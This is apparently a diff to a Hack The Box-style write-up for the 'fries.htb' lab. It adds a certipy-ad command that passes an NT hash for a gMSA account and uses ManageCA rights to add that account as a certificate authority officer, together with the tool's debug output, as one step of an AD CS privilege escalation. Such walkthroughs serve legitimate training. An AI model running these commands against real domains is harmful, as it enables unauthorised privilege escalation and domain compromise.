@@ -1074,8 +1074,31 @@ So the templat recommended in the certipy is also enabled, so i want have to ena
 But i am currently not an enrollee, but since i have ManageCa perms i should be able to add myself
 
 ```python
+certipy-ad ca -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -ns '10.129.244.72' -target 'dc01.fries.htb' -ca 'fries-DC01-CA' -add-officer 'gMSA_CA_prod$' -target 10.129.244.72 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.129.244.72'
+[+] DC IP: None
+[+] DC Host: 'FRIES.HTB'
+[+] Target IP: '10.129.244.72'
+[+] Remote Name: '10.129.244.72'
+[+] Domain: 'FRIES.HTB'
+[+] Username: 'GMSA_CA_PROD$'
+[+] Trying to resolve 'FRIES.HTB' at '10.129.244.72'
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.244.72:636 - ssl
+[+] Default path: DC=fries,DC=htb
+[+] Configuration path: CN=Configuration,DC=fries,DC=htb
+[+] Trying to get DCOM connection for: '10.129.244.72'
+[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'
 ```
+
+So first ill add myself as an enrollee on the `SubCA` template
 
 
 
